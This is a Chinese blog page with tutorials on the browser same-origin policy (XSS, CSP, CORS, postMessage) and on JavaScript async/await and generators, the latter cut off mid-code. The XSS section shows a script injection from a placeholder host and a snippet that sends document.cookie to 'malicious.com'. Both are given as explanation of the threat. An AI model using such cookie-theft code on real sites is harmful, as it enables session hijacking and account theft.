<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> 学海无涯</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 
<script>
var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?b1b5dee3bb1719c8a439f8070118dc80";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();
</script>


      <!-- <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script> -->
      <link href="https://cdn.bootcdn.net/ajax/libs/sweetalert2/11.7.3/sweetalert2.min.css" rel="stylesheet">
      <script src="https://cdn.bootcdn.net/ajax/libs/sweetalert2/11.7.3/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      <canvas class="fireworks"></canvas>
      <style>
        .fireworks {
          position: fixed;
          left: 0;
          top: 0;
          z-index: 99999;
          pointer-events: none;
        }
      </style>
      
      
    <main class="content on">
      
<section class="cover">
    
      
      <a class="forkMe" href="https://github.com/wsq01/"
        target="_blank"><img width="149" height="149" src="/images/forkme.png"
          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover5.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">学海无涯</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-前端/js/深入/浏览器安全——同源策略"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/12/23/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"
    >浏览器安全——同源策略</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/12/23/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/" class="article-date">
  <time datetime="2019-12-23T09:25:09.000Z" itemprop="datePublished">2019-12-23</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/JS/">JS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="什么是同源策略"><a href="#什么是同源策略" class="headerlink" title="什么是同源策略"></a>什么是同源策略</h1><p>要了解什么是同源策略，我们得先来看看什么是同源。</p>
<p>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名<code>www.baidu.com</code>，以及相同的端口 443，所以我们就说这两个 URL 是同源的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.baidu.com/?category=1</span><br><span class="line">https://www.baidu.com/?category=0</span><br></pre></td></tr></table></figure>
<p>浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。</p>
<p>具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。</p>
<h2 id="第一个，DOM-层面"><a href="#第一个，DOM-层面" class="headerlink" title="第一个，DOM 层面"></a>第一个，DOM 层面</h2><p>同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</p>
<p>打开第一个网页，然后再从第一个网页中打开另外一个页面。由于第一个页面和第二个页面是同源关系，所以我们可以在第二个页面中操作第一个页面的 DOM，比如将第一个页面全部隐藏掉，代码如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> pdom = opener.<span class="property">document</span></span><br><span class="line">  pdom.<span class="property">body</span>.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该代码中，对象<code>opener</code>就是指向第一个页面的<code>window</code>对象，我们可以通过操作<code>opener</code>来控制第一个页面中的 DOM。</p>
<p>我们在第二个页面的控制台中执行上面那段代码，就成功地操作了第一个页面中的 DOM，将页面隐藏了。</p>
<p>不过如果打开的第二个页面和第一个页面不是同源的，那么它们就无法相互操作 DOM 了。</p>
<h2 id="第二个，数据层面"><a href="#第二个，数据层面" class="headerlink" title="第二个，数据层面"></a>第二个，数据层面</h2><p>同源策略限制了不同源的站点读取当前站点的<code>Cookie、IndexDB、LocalStorage</code>等数据。由于同源策略，我们依然无法通过第二个页面的<code>opener</code>来访问第一个页面中的<code>Cookie、IndexDB</code>或者<code>LocalStorage</code>等内容。</p>
<h2 id="第三个，网络层面"><a href="#第三个，网络层面" class="headerlink" title="第三个，网络层面"></a>第三个，网络层面</h2><p>同源策略限制了通过<code>XMLHttpRequest</code>等方式将站点的数据发送给不同源的站点。</p>
<h1 id="安全和便利性的权衡"><a href="#安全和便利性的权衡" class="headerlink" title="安全和便利性的权衡"></a>安全和便利性的权衡</h1><p>我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p>
<p>不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击。</p>
<h2 id="1-页面中可以嵌入第三方资源"><a href="#1-页面中可以嵌入第三方资源" class="headerlink" title="1. 页面中可以嵌入第三方资源"></a>1. 页面中可以嵌入第三方资源</h2><p>Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。</p>
<p>所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p>
<p>比如，恶意程序在 HTML 文件内容中插入一段 JavaScript 代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://xxx.com/malicious.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。</p>
<p>除此之外，它还能将页面的的敏感数据，如<code>Cookie、IndexDB、LoacalStorage</code>等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onClick</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="string">`http://malicious.com?cookie = <span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span></span><br><span class="line">  <span class="title function_">open</span>(url)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">onClick</span>()</span><br></pre></td></tr></table></figure>
<p>在这段代码中，恶意脚本读取<code>Cookie</code>数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的<code>Cookie</code>信息。</p>
<p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。</p>
<h2 id="2-跨域资源共享和跨文档消息机制"><a href="#2-跨域资源共享和跨文档消息机制" class="headerlink" title="2. 跨域资源共享和跨文档消息机制"></a>2. 跨域资源共享和跨文档消息机制</h2><p>默认情况下，如果打开第一个页面，在第一个页面中通过<code>XMLHttpRequest</code>或者<code>Fetch</code>来请求第二个页面中的资源，这时同源策略会阻止其向第二个页面发出请求，这样会大大制约我们的生产力。</p>
<p>为了解决这个问题，我们引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p>
<p>如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过<code>window.postMessage</code>的 JavaScript 接口来和不同源的 DOM 进行通信。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p>
<p>不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：</p>
<ul>
<li>页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。</li>
<li>使用<code>XMLHttpRequest</code>和<code>Fetch</code>都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。</li>
<li>两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/" rel="tag">浏览器工作原理与实践</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-前端/js/深入/JS事件循环机制——async await"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/12/06/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94async%20await/"
    >JS事件循环机制——async await</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/12/06/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94async%20await/" class="article-date">
  <time datetime="2019-12-06T10:22:08.000Z" itemprop="datePublished">2019-12-06</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/JS/">JS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>使用<code>Promise</code>能很好地解决回调地狱的问题，但是这种方式充满了<code>Promise</code>的<code>then()</code>方法，如果处理流程比较复杂的话，那么整段代码将充斥着<code>then</code>，语义化不明显，代码不能很好地表示执行流程。</p>
<p>比如下面这样一个实际的使用场景：我先请求<code>a</code>网站的内容，等返回信息之后，我再请求<code>a</code>网站的另外一个资源。下面代码展示的是使用<code>fetch</code>来实现这样的需求，<code>fetch</code>被定义在<code>window</code>对象中，可以用它来发起对远程资源的请求，该方法返回的是一个<code>Promise</code>对象，<code>fetch</code>是浏览器原生支持的，并有没利用<code>XMLHttpRequest</code>来封装。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://www.a.com&#x27;</span>)</span><br><span class="line">	.<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_">fetch</span>(<span class="string">&#x27;https://www.a.com/test&#x27;</span>)</span><br><span class="line">	&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">	&#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">	&#125;)</span><br></pre></td></tr></table></figure>
<p>从这段<code>Promise</code>代码可以看出来，使用<code>promise.then</code>也是相当复杂，虽然整个请求流程已经线性化了，但是代码里面包含了大量的<code>then</code>函数，使得代码依然不是太容易阅读。基于这个原因，ES7 引入了<code>async/await</code>，这是 JavaScript 异步编程的一个重大改进，提供了在不阻塞主线程的情况下使用同步代码实现异步访问资源的能力，并且使得代码逻辑更加清晰。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> response1 = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;https://www.geekbang.org&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;response1&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response1)</span><br><span class="line">    <span class="keyword">let</span> response2 = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;https://www.geekbang.org/test&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;response2&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response2)</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>()</span><br></pre></td></tr></table></figure>
<p>通过上面代码，你会发现整个异步处理的逻辑都是使用同步代码的方式来实现的，而且还支持<code>try catch</code>来捕获异常，这就是完全在写同步代码，所以是非常符合人的线性思维的。</p>
<h1 id="生成器-VS-协程"><a href="#生成器-VS-协程" class="headerlink" title="生成器 VS 协程"></a>生成器 VS 协程</h1><p>我们先来看看什么是生成器函数？</p>
<p>生成器函数是一个带星号函数，而且是可以暂停执行和恢复执行的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">genDemo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; 开始执行第一段 &quot;</span>)</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;generator 2&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; 开始执行第二段 &quot;</span>)</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;generator 2&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; 开始执行第三段 &quot;</span>)</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;generator 2&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; 执行结束 &quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;generator 2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;main 0&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> gen = <span class="title function_">genDemo</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(gen.<span class="title function_">next</span>().<span class="property">value</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;main 1&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(gen.<span class="title function_">next</span>().<span class="property">value</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;main 2&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(gen.<span class="title function_">next</span>().<span class="property">value</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;main 3&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(gen.<span class="title function_">next</span>().<span class="property">value</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;main 4&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>执行上面这段代码，观察输出结果，你会发现函数<code>genDemo</code>并不是一次执行完的，全局代码和<code>genDemo</code>函数交替执行。其实这就是生成器函数的特性，可以暂停执行，也可以恢复执行。下面我们就来看看生成器函数的具体使用方式：</p>
<p>在生成器函数内部执行一段代码，如果遇到<code>yield</code>关键字，那么 JavaScript 引擎将返回关键字后面的内容给外部，并暂停该函数的执行。<br>外部函数可以通过<code>next</code>方法恢复函数的执行。</p>
<p>要搞懂函数为何能暂停和恢复，那你首先要了解协程的概念。协程是一种比线程更加轻量级的存在。你可以把协程看成是跑在线程上的任务，一个线程上可以存在多个协程，但是在线程上同时只能执行一个协程，比如当前执行的是 A 协程，要启动 B 协程，那么 A 协程就需要将主线程的控制权交给 B 协程，这就体现在 A 协程暂停执行，B 协程恢复执行；同样，也可以从 B 协程中启动 A 协程。通常，如果从 A 协程启动 B 协程，我们就把 A 协程称为 B 协程的父协程。</p>
<p>正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。最重要的是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。这样带来的好处就是性能得到了很大的提升，不会像线程切换那样消耗资源。</p>
<p>为了让你更好地理解协程是怎么执行的，我结合上面那段代码的执行过程，画出了下面的“协程执行流程图”，你可以对照着代码来分析：</p>
<img src="/2019/12/06/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94async%20await/img1.png" class="" title="协程执行流程图">

<p>从图中可以看出来协程的四点规则：</p>
<ul>
<li>通过调用生成器函数<code>genDemo</code>来创建一个协程<code>gen</code>，创建之后，<code>gen</code>协程并没有立即执行。</li>
<li>要让<code>gen</code>协程执行，需要通过调用<code>gen.next</code>。</li>
<li>当协程正在执行的时候，可以通过<code>yield</code>关键字来暂停<code>gen</code>协程的执行，并返回主要信息给父协程。</li>
<li>如果协程在执行期间，遇到了<code>return</code>关键字，那么 JavaScript 引擎会结束当前协程，并将<code>return</code>后面的内容返回给父协程。</li>
</ul>
<p>不过，对于上面这段代码，你可能又有这样疑问：父协程有自己的调用栈，<code>gen</code>协程时也有自己的调用栈，当<code>gen</code>协程通过<code>yield</code>把控制权交给父协程时，V8 是如何切换到父协程的调用栈？当父协程通过<code>gen.next</code>恢复<code>gen</code>协程时，又是如何切换<code>gen</code>协程的调用栈？</p>
<p>要搞清楚上面的问题，你需要关注以下两点内容。</p>
<p>第一点：<code>gen</code>协程和父协程是在主线程上交互执行的，并不是并发执行的，它们之前的切换是通过<code>yield</code>和<code>gen.next</code>来配合完成的。</p>
<p>第二点：当在<code>gen</code>协程中调用了<code>yield</code>方法时，JavaScript 引擎会保存<code>gen</code>协程当前的调用栈信息，并恢复父协程的调用栈信息。同样，当在父协程中执行<code>gen.next</code>时，JavaScript 引擎会保存父协程的调用栈信息，并恢复<code>gen</code>协程的调用栈信息。</p>
<p>为了直观理解父协程和<code>gen</code>协程是如何切换调用栈的，你可以参考下图：</p>
<img src="/2019/12/06/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94async%20await/img2.png" class="" title="gen 协程和父协程之间的切换">

<p>到这里相信你已经弄清楚了协程是怎么工作的，其实在 JavaScript 中，生成器就是协程的一种实现方式，这样相信你也就理解什么是生成器了。那么接下来，我们使用生成器和<code>Promise</code>来改造开头的那段<code>Promise</code>代码。改造后的代码如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo 函数</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> response1 = <span class="keyword">yield</span> <span class="title function_">fetch</span>(<span class="string">&#x27;https://www.geekbang.org&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;response1&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(response1)</span><br><span class="line">  <span class="keyword">let</span> response2 = <span class="keyword">yield</span> <span class="title function_">fetch</span>(<span class="string">&#x27;https://www.geekbang.org/test&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;response2&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(response2)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 执行 foo 函数的代码</span></span><br><span class="line"><span class="keyword">let</span> gen = <span class="title function_">foo</span>()</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getGenPromise</span>(<span class="params">gen</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gen.<span class="title function_">next</span>().<span class="property">value</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getGenPromise</span>(gen).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;response1&#x27;</span>)</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">getGenPromise</span>(gen)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;response2&#x27;</span>)</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>从图中可以看到，<code>foo</code>函数是一个生成器函数，在<code>foo</code>函数里面实现了用同步代码形式来实现异步操作；但是在<code>foo</code>函数外部，我们还需要写一段执行<code>foo</code>函数的代码，如上述代码的后半部分所示，那下面我们就来分析下这段代码是如何工作的。</p>
<p>首先执行的是<code>let gen = foo()</code>，创建了<code>gen</code>协程。<br>然后在父协程中通过执行<code>gen.next</code>把主线程的控制权交给<code>gen</code>协程。<br><code>gen</code>协程获取到主线程的控制权后，就调用<code>fetch</code>函数创建了一个<code>Promise</code>对象<code>response1</code>，然后通过<code>yield</code>暂停<code>gen</code>协程的执行，并将<code>response1</code>返回给父协程。<br>父协程恢复执行后，调用<code>response1.then</code>方法等待请求结果。<br>等通过<code>fetch</code>发起的请求完成之后，会调用<code>then</code>中的回调函数，<code>then</code>中的回调函数拿到结果之后，通过调用<code>gen.next</code>放弃主线程的控制权，将控制权交<code>gen</code>协程继续执行下个请求。<br>以上就是协程和<code>Promise</code>相互配合执行的一个大致流程。不过通常，我们把执行生成器的代码封装成一个函数，并把这个执行生成器代码的函数称为执行器，如下面这种方式：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> response1 = <span class="keyword">yield</span> <span class="title function_">fetch</span>(<span class="string">&#x27;https://www.geekbang.org&#x27;</span>)</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;response1&#x27;</span>)</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(response1)</span><br><span class="line">	<span class="keyword">let</span> response2 = <span class="keyword">yield</span> <span class="title function_">fetch</span>(<span 